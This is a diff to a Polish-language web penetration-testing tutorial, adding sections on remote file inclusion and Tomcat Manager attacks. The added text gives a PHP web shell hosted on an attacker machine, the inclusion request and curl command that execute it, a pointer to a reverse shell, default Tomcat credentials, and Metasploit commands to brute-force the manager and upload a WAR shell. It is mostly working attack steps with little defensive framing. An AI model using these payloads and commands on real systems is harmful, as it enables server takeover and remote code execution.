@@ -76,6 +76,31 @@ Testowanie LFI w `ffuf`:
 ffuf -u "http://example.com/index.php?file=FUZZ" -w wordlist.txt
 ```
 
+#### **2.3 Remote File Inclusion (RFI)**
+RFI to groźniejszy wariant — zamiast lokalnego pliku, aplikacja ładuje zdalny skrypt z serwera atakującego. Wymaga `allow_url_include=On` w `php.ini` (domyślnie wyłączone w nowszych wersjach PHP, ale często włączone w starych środowiskach).
+
+Na serwerze atakującego przygotuj plik `shell.txt`:
+```php
+<?php echo shell_exec($_GET['cmd']); ?>
+```
+
+Uruchom prosty serwer HTTP na Kali:
+```bash
+python3 -m http.server 8080
+```
+
+Wyślij żądanie RFI do podatnej aplikacji:
+```http
+http://example.com/index.php?file=http://192.168.1.100:8080/shell.txt
+```
+
+Weryfikacja wykonania kodu:
+```bash
+curl "http://example.com/index.php?file=http://192.168.1.100:8080/shell.txt&cmd=id"
+```
+
+Jeśli serwer zwróci wynik `id` — masz RCE. Następny krok: wstrzyknij pełny reverse shell.
+
 #### **2.3 Niezabezpieczone katalogi**
 Niektóre serwery umożliwiają listowanie katalogów, co pozwala na pobieranie plików.
 
@@ -87,6 +112,33 @@ http://example.com/backups/
 Można też użyć `wget` do pobrania całej zawartości:
 ```bash
 wget -r http://example.com/uploads/
+```
+
+---
+
+## 🐱 Brute-force panelu Tomcat Manager
+
+Apache Tomcat Manager (`/manager/html`) jest częstym celem — wystawiony na internet ze słabymi danymi logowania daje RCE przez upload pliku WAR.
+
+### **Moduł Metasploit**
+```bash
+use auxiliary/scanner/http/tomcat_mgr_login
+set RHOSTS 192.168.1.10
+set RPORT 8080
+set STOP_ON_SUCCESS true
+run
+```
+
+Domyślne dane logowania do sprawdzenia: `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`.
+
+### **Po udanym logowaniu — upload webshella WAR**
+```bash
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS 192.168.1.10
+set HttpUsername tomcat
+set HttpPassword tomcat
+set LHOST 192.168.1.100
+exploit
 ```
 
 ---
